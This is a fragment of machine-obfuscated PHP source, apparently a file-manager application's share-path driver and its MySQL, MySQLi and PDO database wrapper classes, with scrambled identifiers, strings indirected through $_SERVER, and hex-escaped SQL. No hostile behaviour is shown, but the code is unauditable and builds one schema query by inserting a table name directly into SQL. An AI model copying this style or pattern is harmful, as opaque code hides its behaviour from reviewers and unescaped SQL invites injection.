show_json($¨¥Âƒ·œ[1430] . $ì¢ùúÁ, !1); } $¹ËËõƒ = $this->model->fileInfoGet($ì¢ùúÁ); $ü³¢î[$¨¥Âƒ·œ[183]] = $¹ËËõƒ[$¨¥Âƒ·œ[87]]; $GLOBALS[$¨¥Âƒ·œ[182]] = $ü³¢î; IO::fileOutImage($¹ËËõƒ[$¨¥Âƒ·œ[87]], $Ğ®¶çƒ”); } public function fileOutImage($¹¥Ô¹›, $ÙæÎÛË = 250) { $this->_fileOutImage($¹¥Ô¹›, $ÙæÎÛË); } public function fileOutImageServer($íÌøİ¼‘, $±èÜÓ“º = 250) { $this->_fileOutImage($íÌøİ¼‘, $±èÜÓ“º); } public function link($ÎåêË•¿, $ª·ñ™¯ = '') { $ÂÕ‚ôÛÓ = $this->model->fileInfoGet($ÎåêË•¿); return IO::link($ÂÕ‚ôÛÓ[$_SERVER[¿ğÚ‰±–][87]], $ª·ñ™¯); } protected function parse($ø¤êİ) { $Ğçñ·½ï =& $_SERVER[¿ğÚ‰±–]; if (strstr($ø¤êİ, $Ğçñ·½ï[8]) === !1) { return array($Ğçñ·½ï[493] => intval($ø¤êİ), $Ğçñ·½ï[87] => $Ğçñ·½ï[12], $Ğçñ·½ï[1426] => array()); } $Š† î¤â = explode($Ğçñ·½ï[8], trim($ø¤êİ, $Ğçñ·½ï[8])); if (count($Š† î¤â) < 2) { show_tips(clear_html($ø¤êİ) . $Ğçñ·½ï[1431]); } return array($Ğçñ·½ï[493] => intval($Š† î¤â[0]), $Ğçñ·½ï[87] => $Š† î¤â[1], $Ğçñ·½ï[1426] => array_slice($Š† î¤â, 1)); } } class PathDriverDbShareItem extends PathDriverDB { public function __construct($Â„¢õ·ò) { $this->pathParse = $Â„¢õ·ò; $this->model = Model($_SERVER[¿ğÚ‰±–][1425]); } public function getPathOuter($ÎÖ¹ı­·) { $ò¦¾Ğ½Á =& $_SERVER[¿ğÚ‰±–]; if (!$ÎÖ¹ı­·) { return $ÎÖ¹ı­·; } $™¬¡·ÓØ = $this->parse($ÎÖ¹ı­·); return trim(KodIO::makeShare($this->pathParse[$ò¦¾Ğ½Á[475]], $™¬¡·ÓØ[$ò¦¾Ğ½Á[475]]), $ò¦¾Ğ½Á[8]); } protected function infoParse($÷Ö¬¿Øà, $Îë­êê  = false, $óˆßÙ¯Ÿ = false) { $ÙÉÅüÑ =& $_SERVER[¿ğÚ‰±–]; $õ¨Äã = $this->pathParse[$ÙÉÅüÑ[475]]; $Ä»Û = trim($this->pathParse[$ÙÉÅüÑ[1257]], $ÙÉÅüÑ[8]); return Action($ÙÉÅüÑ[1432])->sharePathInfo($õ¨Äã, $Ä»Û, $Îë­êê ); } public function infoFull($¥¨ ôš) { $´•¹»£÷ =& $_SERVER[¿ğÚ‰±–]; $ÖˆÎ¦Õ± = explode($´•¹»£÷[8], trim($¥¨ ôš, $´•¹»£÷[8])); if (count($ÖˆÎ¦Õ±) > 1) { $µ®´µ†ş = implode($´•¹»£÷[8], array_splice($ÖˆÎ¦Õ±, 1)); $«»¯ºí = $this->model->pathInfoByPath($ÖˆÎ¦Õ±[0], $µ®´µ†ş); if (!$«»¯ºí) { return !1; } $this->pathParse[$´•¹»£÷[1257]] = $«»¯ºí[$´•¹»£÷[193]]; } return $this->infoParse($¥¨ ôš); } public function listAll($”¯Ã„„ç) { $Ğıßâ‘ =& $_SERVER[¿ğÚ‰±–]; $“ŞßõÄ = IO::info($this->pathParse[$Ğıßâ‘[87]]); if (!$“ŞßõÄ) { return array(); } $É•©€øÙ = $this->model->listAll($”¯Ã„„ç); $©ñı¨” = Model($Ğıßâ‘[664])->getInfo($“ŞßõÄ[$Ğıßâ‘[665]]); foreach ($É•©€øÙ as &$”šòìŞÒ) { check_abort(); $”šòìŞÒ[$Ğıßâ‘[90]] = Action($Ğıßâ‘[1432])->_shareItemeParse($”šòìŞÒ[$Ğıßâ‘[90]], $©ñı¨”); } unset($”šòìŞÒ); return $É•©€øÙ; } } goto a‰ºŸòÕ‰’; e–ô®Ç¤˜: class DbMysql extends Db { public function __construct($Ê’Ûû§Ì = '') { $ÇË‰Ê¸ù =& $_SERVER[¿ğÚ‰±–]; if (!extension_loaded($ÇË‰Ê¸ù[882])) { think_exception(think_lang($ÇË‰Ê¸ù[14]) . $ÇË‰Ê¸ù[970]); } if (!empty($Ê’Ûû§Ì)) { $this->config = $Ê’Ûû§Ì; if (empty($this->config[$ÇË‰Ê¸ù[17]])) { $this->config[$ÇË‰Ê¸ù[17]] = $ÇË‰Ê¸ù[12]; } } } public function connect($º†Çóâï = '', $¨âõ««ª = 0, $ğĞòß˜ş = false) { $±Ì™–ê =& $_SERVER[¿ğÚ‰±–]; if (!isset($this->linkID[$¨âõ««ª])) { if (empty($º†Çóâï)) { $º†Çóâï = $this->config; } $ÕÒƒÃÔ‹ = $º†Çóâï[$±Ì™–ê[971]] . ($º†Çóâï[$±Ì™–ê[972]] ? "\x3a{$º†Çóâï[$±Ì™–ê[972]]}" : $±Ì™–ê[12]); $ãé¶ = !empty($º†Çóâï[$±Ì™–ê[17]][$±Ì™–ê[18]]) ? $º†Çóâï[$±Ì™–ê[17]][$±Ì™–ê[18]] : $this->pconnect; if ($ãé¶) { $this->linkID[$¨âõ««ª] = mysql_pconnect($ÕÒƒÃÔ‹, $º†Çóâï[$±Ì™–ê[973]], $º†Çóâï[$±Ì™–ê[974]], 131072); } else { $this->linkID[$¨âõ««ª] = mysql_connect($ÕÒƒÃÔ‹, $º†Çóâï[$±Ì™–ê[973]], $º†Çóâï[$±Ì™–ê[974]], !0, 131072); } if (!$this->linkID[$¨âõ««ª] || !empty($º†Çóâï[$±Ì™–ê[21]]) && !mysql_select_db($º†Çóâï[$±Ì™–ê[21]], $this->linkID[$¨âõ««ª])) { think_exception(mysql_error()); } $ôÒ‰©¾î = mysql_get_server_info($this->linkID[$¨âõ««ª]); mysql_query($±Ì™–ê[975] . think_config($±Ì™–ê[976]) . $±Ì™–ê[58], $this->linkID[$¨âõ««ª]); if ($ôÒ‰©¾î > $±Ì™–ê[977]) { mysql_query($±Ì™–ê[978], $this->linkID[$¨âõ««ª]); } $this->connected = !0; if (1 != think_config($±Ì™–ê[22])) { unset($this->config); } } return $this->linkID[$¨âõ««ª]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($¦Şö‘¨œ) { $½•ùôø½ =& $_SERVER[¿ğÚ‰±–]; if (0 === stripos($¦Şö‘¨œ, $½•ùôø½[341])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $¦Şö‘¨œ; if ($this->queryID) { $this->free(); } think_action_status($½•ùôø½[23], 1); think_status($½•ùôø½[24]); $this->queryID = mysql_query($¦Şö‘¨œ, $this->_linkID); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } } public function execute($ª ˜ùÂ†) { $ø°™™åò =& $_SERVER[¿ğÚ‰±–]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $ª ˜ùÂ†; if ($this->queryID) { $this->free(); } think_action_status($ø°™™åò[25], 1); think_status($ø°™™åò[24]); $ºÙÕ­‡Ù = mysql_query($ª ˜ùÂ†, $this->_linkID); $this->debug(); if (!1 === $ºÙÕ­‡Ù) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[¿ğÚ‰±–][979], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $¡ËÀ ÌÇ = mysql_query($_SERVER[¿ğÚ‰±–][980], $this->_linkID); $this->transTimes = 0; if (!$¡ËÀ ÌÇ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $çİŸ—Á = mysql_query($_SERVER[¿ğÚ‰±–][981], $this->_linkID); $this->transTimes = 0; if (!$çİŸ—Á) { $this->error(); return !1; } } return !0; } private function getAll() { $©¡äâŸÂ = array(); if ($this->numRows > 0) { while ($ºëªòáú = mysql_fetch_assoc($this->queryID)) { $©¡äâŸÂ[] = $ºëªòáú; } mysql_data_seek($this->queryID, 0); } return $©¡äâŸÂ; } public function getFields($£Å–Î¶) { $­ñÎÈ÷ï =& $_SERVER[¿ğÚ‰±–]; $È·Ş³†Ë = $this->query($­ñÎÈ÷ï[982] . $this->parseKey($£Å–Î¶)); $éòÓ¼ïö = array(); if ($È·Ş³†Ë) { foreach ($È·Ş³†Ë as $œ…ˆÊÎ => $œæÚ•Ò‚) { $éòÓ¼ïö[$œæÚ•Ò‚[$­ñÎÈ÷ï[31]]] = array($­ñÎÈ÷ï[32] => $œæÚ•Ò‚[$­ñÎÈ÷ï[31]], $­ñÎÈ÷ï[33] => $œæÚ•Ò‚[$­ñÎÈ÷ï[34]], $­ñÎÈ÷ï[35] => (bool) (strtoupper($œæÚ•Ò‚[$­ñÎÈ÷ï[36]]) === $­ñÎÈ÷ï[983]), $­ñÎÈ÷ï[37] => $œæÚ•Ò‚[$­ñÎÈ÷ï[38]], $­ñÎÈ÷ï[39] => strtolower($œæÚ•Ò‚[$­ñÎÈ÷ï[40]]) == $­ñÎÈ÷ï[41], $­ñÎÈ÷ï[42] => strtolower($œæÚ•Ò‚[$­ñÎÈ÷ï[43]]) == $­ñÎÈ÷ï[44]); } } return $éòÓ¼ïö; } public function getTables($¢ŒÕê¸Î = '') { $¤ª¢äƒ =& $_SERVER[¿ğÚ‰±–]; if (!empty($¢ŒÕê¸Î)) { $ÊÀÖ¿¶î = $¤ª¢äƒ[984] . $¢ŒÕê¸Î . $¤ª¢äƒ[985]; } else { $ÊÀÖ¿¶î = $¤ª¢äƒ[986]; } $¸İíÍ¶È = $this->query($ÊÀÖ¿¶î); $‹æÎ‚æÔ = array(); foreach ($¸İíÍ¶È as $åÓªëí => $üé‡) { $‹æÎ‚æÔ[$åÓªëí] = current($üé‡); } return $‹æÎ‚æÔ; } public function replace($Œ…ï½îƒ, $â‰ö¶†¹ = array()) { $Ÿ«Ë¿ÊÅ =& $_SERVER[¿ğÚ‰±–]; foreach ($Œ…ï½îƒ as $ğ³¨¨Å => $³‚Šìø×) { $ùá¦èö = $this->parseValue($³‚Šìø×); if (is_scalar($ùá¦èö)) { $‚×œ½š×[] = $ùá¦èö; $‰ãœÚ›[] = $this->parseKey($ğ³¨¨Å); } } $âÁ“ˆ˜Ù = $Ÿ«Ë¿ÊÅ[987] . $this->parseTable($â‰ö¶†¹[$Ÿ«Ë¿ÊÅ[356]]) . $Ÿ«Ë¿ÊÅ[988] . implode($Ÿ«Ë¿ÊÅ[50], $‰ãœÚ›) . $Ÿ«Ë¿ÊÅ[989] . implode($Ÿ«Ë¿ÊÅ[50], $‚×œ½š×) . $Ÿ«Ë¿ÊÅ[990]; return $this->execute($âÁ“ˆ˜Ù); } public function insertAll($¯…õ—ƒÖ, $î—Šñ® = array(), $ÚãİëÜé = false) { $¢ßìÜ°ª =& $_SERVER[¿ğÚ‰±–]; if (!is_array($¯…õ—ƒÖ[0])) { return !1; } $ŠìŒ‚‚ = array_keys($¯…õ—ƒÖ[0]); $€Ñ»´Ë… = array(); foreach ($¯…õ—ƒÖ as $ï ì’ı²) { $à€å›ÃÔ = array(); foreach ($ï ì’ı² as $ Á–üåš => $¶ºí§˜) { $¶ºí§˜ = $this->parseValue($¶ºí§˜); if (is_scalar($¶ºí§˜)) { $à€å›ÃÔ[] = $¶ºí§˜; } } $€Ñ»´Ë…[] = $¢ßìÜ°ª[337] . implode($¢ßìÜ°ª[50], $à€å›ÃÔ) . $¢ßìÜ°ª[990]; } array_walk($ŠìŒ‚‚, array($this, $¢ßìÜ°ª[991])); $Úı­¡† = ($ÚãİëÜé ? $¢ßìÜ°ª[992] : $¢ßìÜ°ª[993]) . $¢ßìÜ°ª[994] . $this->parseTable($î—Šñ®[$¢ßìÜ°ª[356]]) . $¢ßìÜ°ª[988] . implode($¢ßìÜ°ª[50], $ŠìŒ‚‚) . $¢ßìÜ°ª[995] . implode($¢ßìÜ°ª[50], $€Ñ»´Ë…); return $this->execute($Úı­¡†); } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $™™õ¡èí =& $_SERVER[¿ğÚ‰±–]; $this->error = mysql_errno() . $™™õ¡èí[4] . mysql_error($this->_linkID); if ($™™õ¡èí[12] != $this->queryStr) { $this->error .= LNG($™™õ¡èí[48]) . $this->queryStr; } think_trace($this->error, $™™õ¡èí[12], $™™õ¡èí[49]); return $this->error; } public function escapeString($Ş´è“œ) { if ($this->_linkID) { return mysql_real_escape_string($Ş´è“œ, $this->_linkID); } else { return mysql_escape_string($Ş´è“œ); } } public function parseKey(&$ğ¸ÅïÒ”, $åç°Ù½ = true) { $€–”ó =& $_SERVER[¿ğÚ‰±–]; if ($åç°Ù½) { $ğ¸ÅïÒ” = $this->parseKeyCheck($ğ¸ÅïÒ”); } if ($ğ¸ÅïÒ” != $€–”ó[220] && !preg_match($€–”ó[996], $ğ¸ÅïÒ”)) { $ğ¸ÅïÒ” = $€–”ó[461] . trim($ğ¸ÅïÒ”, $€–”ó[461]) . $€–”ó[461]; } return $ğ¸ÅïÒ”; } } class DbMysqli extends Db { public function __construct($Ú¯Ù¢ù = '') { $¶÷‰¶Ò¨ =& $_SERVER[¿ğÚ‰±–]; if (!extension_loaded($¶÷‰¶Ò¨[997])) { think_exception(think_lang($¶÷‰¶Ò¨[14]) . $¶÷‰¶Ò¨[998]); } if (!empty($Ú¯Ù¢ù)) { $this->config = $Ú¯Ù¢ù; if (empty($this->config[$¶÷‰¶Ò¨[17]])) { $this->config[$¶÷‰¶Ò¨[17]] = $¶÷‰¶Ò¨[12]; } } } public function connect($ò“‹âıİ = '', $¿ µ¢÷… = 0) { $‰ŞÁ•º† =& $_SERVER[¿ğÚ‰±–]; if (!isset($this->linkID[$¿ µ¢÷…])) { if (empty($ò“‹âıİ)) { $ò“‹âıİ = $this->config; } $this->linkID[$¿ µ¢÷…] = new mysqli($ò“‹âıİ[$‰ŞÁ•º†[971]], $ò“‹âıİ[$‰ŞÁ•º†[973]], $ò“‹âıİ[$‰ŞÁ•º†[974]], $ò“‹âıİ[$‰ŞÁ•º†[21]], $ò“‹âıİ[$‰ŞÁ•º†[972]] ? intval($ò“‹âıİ[$‰ŞÁ•º†[972]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } $¾Ğ®µØ = $this->linkID[$¿ µ¢÷…]->server_version; $this->linkID[$¿ µ¢÷…]->query($‰ŞÁ•º†[975] . think_config($‰ŞÁ•º†[976]) . $‰ŞÁ•º†[58]); if ($¾Ğ®µØ > $‰ŞÁ•º†[977]) { $this->linkID[$¿ µ¢÷…]->query($‰ŞÁ•º†[978]); } $this->connected = !0; if (1 != think_config($‰ŞÁ•º†[22])) { unset($this->config); } } return $this->linkID[$¿ µ¢÷…]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($ææ²‹´İ) { $»ÛïÓ¿ =& $_SERVER[¿ğÚ‰±–]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $ææ²‹´İ; if ($this->queryID) { $this->free(); } think_action_status($»ÛïÓ¿[23], 1); think_status($»ÛïÓ¿[24]); $this->queryID = $this->_linkID->query($ææ²‹´İ); if ($this->_linkID->more_results()) { while (($¾Ãä’Ÿ· = $this->_linkID->next_result()) != NULL) { $¾Ãä’Ÿ·->free_result(); } } $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } } public function execute($ÏĞ¡óÆ ) { $¾á£‘«Ê =& $_SERVER[¿ğÚ‰±–]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $ÏĞ¡óÆ ; if ($this->queryID) { $this->free(); } think_action_status($¾á£‘«Ê[25], 1); think_status($¾á£‘«Ê[24]); $ô¢‡ˆÕ = $this->_linkID->query($ÏĞ¡óÆ ); $this->debug(); if (!1 === $ô¢‡ˆÕ) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ÉÙÎˆ¤ƒ = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$ÉÙÎˆ¤ƒ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $ş–ğˆ€× = $this->_linkID->rollback(); $this->transTimes = 0; if (!$ş–ğˆ€×) { $this->error(); return !1; } } return !0; } private function getAll() { $Ïñ»ù•ô = array(); if ($this->numRows > 0) { for ($Ñ¶ÆîúÑ = 0; $Ñ¶ÆîúÑ < $this->numRows; $Ñ¶ÆîúÑ++) { $Ïñ»ù•ô[$Ñ¶ÆîúÑ] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $Ïñ»ù•ô; } public function getFields($áœéãÖ”) { $®Ÿõ€š =& $_SERVER[¿ğÚ‰±–]; $µÏ¾»‡Ñ = $this->query($®Ÿõ€š[982] . $this->parseKey($áœéãÖ”)); $òìÑ–¨× = array(); if ($µÏ¾»‡Ñ) { foreach ($µÏ¾»‡Ñ as $¼‰´œÙ¯ => $„üÙ±µ) { $òìÑ–¨×[$„üÙ±µ[$®Ÿõ€š[31]]] = array($®Ÿõ€š[32] => $„üÙ±µ[$®Ÿõ€š[31]], $®Ÿõ€š[33] => $„üÙ±µ[$®Ÿõ€š[34]], $®Ÿõ€š[35] => (bool) ($„üÙ±µ[$®Ÿõ€š[36]] === $®Ÿõ€š[12]), $®Ÿõ€š[37] => $„üÙ±µ[$®Ÿõ€š[38]], $®Ÿõ€š[39] => strtolower($„üÙ±µ[$®Ÿõ€š[40]]) == $®Ÿõ€š[41], $®Ÿõ€š[42] => strtolower($„üÙ±µ[$®Ÿõ€š[43]]) == $®Ÿõ€š[44]); } } return $òìÑ–¨×; } public function getTables($€ùÙš³÷ = '') { $¾˜‡ãÉÔ =& $_SERVER[¿ğÚ‰±–]; $«‘îŠİŠ = !empty($€ùÙš³÷) ? $¾˜‡ãÉÔ[984] . $€ùÙš³÷ . $¾˜‡ãÉÔ[985] : $¾˜‡ãÉÔ[986]; $µûÆŞş = $this->query($«‘îŠİŠ); $í‰×œµ = array(); if ($µûÆŞş) { foreach ($µûÆŞş as $±¥Ú³åõ => $šœÒÂ“¤) { $í‰×œµ[$±¥Ú³åõ] = current($šœÒÂ“¤); } } return $í‰×œµ; } public function replace($×¾¢·Öª, $»ÂÎò²Æ = array()) { $ÔÊ ãøö =& $_SERVER[¿ğÚ‰±–]; foreach ($×¾¢·Öª as $„¶¡¸ÍÇ => $á¯£ØÉ–) { $ü­Û«ñØ = $this->parseValue($á¯£ØÉ–); if (is_scalar($ü­Û«ñØ)) { $ØºîûßÅ[] = $ü­Û«ñØ; $ï®¬Îæ¥[] = $this->parseKey($„¶¡¸ÍÇ); } } $Ù¬ûÈ¢ = $ÔÊ ãøö[987] . $this->parseTable($»ÂÎò²Æ[$ÔÊ ãøö[356]]) . $ÔÊ ãøö[988] . implode($ÔÊ ãøö[50], $ï®¬Îæ¥) . $ÔÊ ãøö[989] . implode($ÔÊ ãøö[50], $ØºîûßÅ) . $ÔÊ ãøö[990]; return $this->execute($Ù¬ûÈ¢); } public function insertAll($­ã­ÕŸ, $ù­¦üŸğ = array(), $á™‰òùœ = false) { $¹“³Õß· =& $_SERVER[¿ğÚ‰±–]; if (!is_array($­ã­ÕŸ[0])) { return !1; } $Ã”áÉÖ° = array_keys($­ã­ÕŸ[0]); $—´Çıİù = array(); foreach ($­ã­ÕŸ as $ôöü— ) { $³œ…²¯ç = array(); foreach ($ôöü—  as $£¹ÓçãÆ => $  §‘Ü¬) { $  §‘Ü¬ = $this->parseValue($  §‘Ü¬); if (is_scalar($  §‘Ü¬)) { $³œ…²¯ç[] = $  §‘Ü¬; } } $—´Çıİù[] = $¹“³Õß·[337] . implode($¹“³Õß·[50], $³œ…²¯ç) . $¹“³Õß·[990]; } array_walk($Ã”áÉÖ°, array($this, $¹“³Õß·[991])); $úœ„È¿ = $á™‰òùœ ? $¹“³Õß·[992] : $¹“³Õß·[993]; $íˆ¾…›ø = $úœ„È¿ . $¹“³Õß·[994] . $this->parseTable($ù­¦üŸğ[$¹“³Õß·[356]]) . $¹“³Õß·[988] . implode($¹“³Õß·[50], $Ã”áÉÖ°) . $¹“³Õß·[995] . implode($¹“³Õß·[50], $—´Çıİù); return $this->execute($íˆ¾…›ø); } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $ÏÁ«Ù°Ô =& $_SERVER[¿ğÚ‰±–]; $this->error = $this->_linkID->errno . $ÏÁ«Ù°Ô[4] . $this->_linkID->error; if ($ÏÁ«Ù°Ô[12] != $this->queryStr) { $this->error .= LNG($ÏÁ«Ù°Ô[48]) . $this->queryStr; } think_trace($this->error, $ÏÁ«Ù°Ô[12], $ÏÁ«Ù°Ô[49]); return $this->error; } public function escapeString($éê›¢) { if ($this->_linkID) { return $this->_linkID->real_escape_string($éê›¢); } else { return addslashes($éê›¢); } } public function parseKey(&$Ü‡Ï…ú, $óí•¾Â = true) { $Ïèšñ³¨ =& $_SERVER[¿ğÚ‰±–]; if ($óí•¾Â) { $Ü‡Ï…ú = $this->parseKeyCheck($Ü‡Ï…ú); } if ($Ü‡Ï…ú != $Ïèšñ³¨[220] && !preg_match($Ïèšñ³¨[996], $Ü‡Ï…ú)) { $Ü‡Ï…ú = $Ïèšñ³¨[461] . trim($Ü‡Ï…ú, $Ïèšñ³¨[461]) . $Ïèšñ³¨[461]; } return $Ü‡Ï…ú; } } class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($ïŠ©Úó = '') { $÷Ï¦øç£ =& $_SERVER[¿ğÚ‰±–]; if (!class_exists($÷Ï¦øç£[999])) { think_exception(think_lang($÷Ï¦øç£[14]) . $÷Ï¦øç£[1000]); } if (!empty($ïŠ©Úó)) { $this->config = $ïŠ©Úó; if (empty($this->config[$÷Ï¦øç£[17]])) { $this->config[$÷Ï¦øç£[17]] = array(); } } } public function connect($¨ØŞŠ¦¿ = '', $‹ä²¨œÂ = 0) { $äŒş¦Õ‚ =& $_SERVER[¿ğÚ‰±–]; if (!isset($this->linkID[$‹ä²¨œÂ])) { if (empty($¨ØŞŠ¦¿)) { $¨ØŞŠ¦¿ = $this->config; } $æÔİì‘¨ = !empty($¨ØŞŠ¦¿[$äŒş¦Õ‚[17]][$äŒş¦Õ‚[18]]) ? $¨ØŞŠ¦¿[$äŒş¦Õ‚[17]][$äŒş¦Õ‚[18]] : $this->pconnect; if ($æÔİì‘¨) { $¨ØŞŠ¦¿[$äŒş¦Õ‚[17]][PDO::ATTR_PERSISTENT] = !0; } try { $this->linkID[$‹ä²¨œÂ] = new PDO($¨ØŞŠ¦¿[$äŒş¦Õ‚[1001]], $¨ØŞŠ¦¿[$äŒş¦Õ‚[973]], $¨ØŞŠ¦¿[$äŒş¦Õ‚[974]], $¨ØŞŠ¦¿[$äŒş¦Õ‚[17]]); } catch (PDOException $½¬ §¦¬) { think_exception($½¬ §¦¬->getMessage()); } $this->dbType = $this->_getDsnType($¨ØŞŠ¦¿[$äŒş¦Õ‚[1001]]); if (in_array($this->dbType, array($äŒş¦Õ‚[1002], $äŒş¦Õ‚[1003], $äŒş¦Õ‚[1004], $äŒş¦Õ‚[1005]))) { think_exception($äŒş¦Õ‚[1006] . $this->dbType . $äŒş¦Õ‚[1007] . $this->dbType . $äŒş¦Õ‚[1008]); } if (!$this->linkID[$‹ä²¨œÂ]) { think_exception($äŒş¦Õ‚[1009]); } try { $this->linkID[$‹ä²¨œÂ]->exec($äŒş¦Õ‚[1010] . think_config($äŒş¦Õ‚[976])); } catch (Exception $½¬ §¦¬) { } $this->connected = !0; if (1 != think_config($äŒş¦Õ‚[22])) { unset($this->config); } } return $this->linkID[$‹ä²¨œÂ]; } public function free() { $this->PDOStatement = null; } public function query($é–ú°ˆ¤, $ıÆ£ùÒ = array()) { $Òù•»éò =& $_SERVER[¿ğÚ‰±–]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $é–ú°ˆ¤; if (!empty($ıÆ£ùÒ)) { $this->queryStr .= $Òù•»éò[1011] . print_r($ıÆ£ùÒ, !0) . $Òù•»éò[1012]; } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($Òù•»éò[23], 1); think_status($Òù•»éò[24]); $this->PDOStatement = $this->_linkID->prepare($é–ú°ˆ¤); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $×ÆÖ­— = $this->PDOStatement->execute($ıÆ£ùÒ); $this->debug(); if (!1 === $×ÆÖ­—) { $this->error(); return !1; } else { return $this->getAll(); } } public function execute($Æ¶»„·, $šŒÌ¾œ = array()) { $¡¾áÄé =& $_SERVER[¿ğÚ‰±–]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $Æ¶»„·; if (!empty($šŒÌ¾œ)) { $this->queryStr .= $¡¾áÄé[1011] . print_r($šŒÌ¾œ, !0) . $¡¾áÄé[1012]; } $¾¸ˆ¤Õâ = !1; if ($this->dbType == $¡¾áÄé[1005]) { if (preg_match($¡¾áÄé[1013], $this->queryStr, $Ë÷ìÂÇ¹)) { $this->table = think_config($¡¾áÄé[1014]) . str_ireplace(think_config($¡¾áÄé[1015]), $¡¾áÄé[454], $Ë÷ìÂÇ¹[2]); $¾¸ˆ¤Õâ = (bool) $this->query($¡¾áÄé[1016] . strtoupper($this->table) . $¡¾áÄé[58]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($¡¾áÄé[25], 1); think_status($¡¾áÄé[24]); $this->PDOStatement = $this->_linkID->prepare($Æ¶»„·); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $¶Èå‡Øò = $this->PDOStatement->execute($šŒÌ¾œ); $this->debug(); if (!1 === $¶Èå‡Øò) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($¾¸ˆ¤Õâ || preg_match($¡¾áÄé[1017], $Æ¶»„·)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $Ë³¯‘† = $this->_linkID->commit(); $this->transTimes = 0; if (!$Ë³¯‘†) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $’–ïÔ³ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$’–ïÔ³) { $this->error(); return !1; } } return !0; } private function getAll() { $Ò•™Î® = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($Ò•™Î®); return $Ò•™Î®; } public function getFields($ÒäÆ˜‰•) { $­‘Ôï”ê =& $_SERVER[¿ğÚ‰±–]; $this->initConnect(!0); if (think_config($­‘Ôï”ê[1018])) { $½ö™îóÓ = str_replace($­‘Ôï”ê[1019], $ÒäÆ˜‰•, think_config($­‘Ôï”ê[1018])); } else { switch ($this->dbType) { case $­‘Ôï”ê[1002]: case $­‘Ôï”ê[1020]: $½ö™îóÓ = "\x53\105\x4c\x45\x43\x54\40\x20\x20\143\157\x6c\165\155\x6e\x5f\x6e\141\155\x65\40\141\x73\40\x27\x4e\141\155\145\47\54\40\x20\x20\x64\x61\x74\x61\x5f\164\171\x70\145\x20\x61\x73\40\47\x54\171\160\145\47\x2c\x20\40\x20\x63\x6f\154\165\155\156\137\x64\x65\146\141\165\x6c\164\x20\x61\x73\40\47\104\x65\x66\x61\x75\x6c\x74\47\x2c\40\x20\x20\x69\x73\137\156\x75\x6c\154\x61\142\154\145\40\141\x73\40\47\116\x75\154\154\47\12\x9\x9\x46\x52\x4f\x4d\11\x69\x6e\146\x6f\x72\x6d\x61\164\151\157\156\137\163\x63\150\145\x6d\x61\x2e\164\141\142\x6c\145\163\40\x41\x53\40\164\12\x9\x9\112\x4f\111\x4e\x9\151\x6e\146\157\162\x6d\x61\164\151\157\156\x5f\x73\x63\x68\145\155\x61\56\143\157\x6c\x75\155\x6e\163\40\x41\x53\x20\x63\12\11\11\x4f\116\x20\40\164\x2e\164\x61\x62\x6c\145\x5f\143\141\x74\x61\154\x6f\x67\40\75\40\x63\x2e\x74\141\x62\154\145\137\x63\x61\164\141\154\x6f\x67\12\11\11\x41\x4e\104\x20\164\x2e\x74\x61\x62\x6c\145\137\x73\x63\x68\145\x6d\141\x20\x3d\40\x63\56\164\x61\142\154\145\137\x73\143\x68\145\155\x61\12\x9\11\101\x4e\104\x20\164\56\x74\141\x62\154\145\x5f\x6e\141\155\145\40\x3d\40\143\x2e\x74\x61\142\x6c\145\x5f\x6e\141\x6d\145\xa\11\11\x57\x48\105\x52\x45\x20\40\x20\164\56\x74\x61\x62\x6c\145\x5f\x6e\141\x6d\145\x20\x3d\40\47{$ÒäÆ˜‰•}\x27"; break; case $­‘Ôï”ê[1021]: $½ö™îóÓ = $­‘Ôï”ê[1022] . $ÒäÆ˜‰• . $­‘Ôï”ê[1023]; break; case $­‘Ôï”ê[1003]: case $­‘Ôï”ê[1005]: $½ö™îóÓ = $­‘Ôï”ê[1024] . $­‘Ôï”ê[1025] . $­‘Ôï”ê[1026] . 